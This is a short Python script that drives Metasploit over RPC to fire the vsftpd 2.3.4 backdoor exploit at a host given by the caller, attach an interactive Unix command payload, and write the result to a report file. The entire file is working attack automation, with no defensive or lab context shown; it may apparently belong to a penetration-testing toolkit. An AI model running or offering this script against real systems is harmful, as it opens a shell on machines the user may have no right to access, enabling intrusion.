from pymetasploit3.msfrpc import MsfRpcClient
import os

def run_exploit(rhost, password='yourpassword'):
    os.makedirs("reports", exist_ok=True)
    client = MsfRpcClient(password)

    exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
    exploit['RHOSTS'] = rhost
    payload = client.modules.use('payload', 'cmd/unix/interact')

    print("[*] Running Metasploit exploit...")
    result = exploit.execute(payload=payload)
    with open("reports/metasploit_result.txt", "w") as f:
        f.write(str(result))
    print("[+] Exploit attempt saved to reports/metasploit_result.txt")
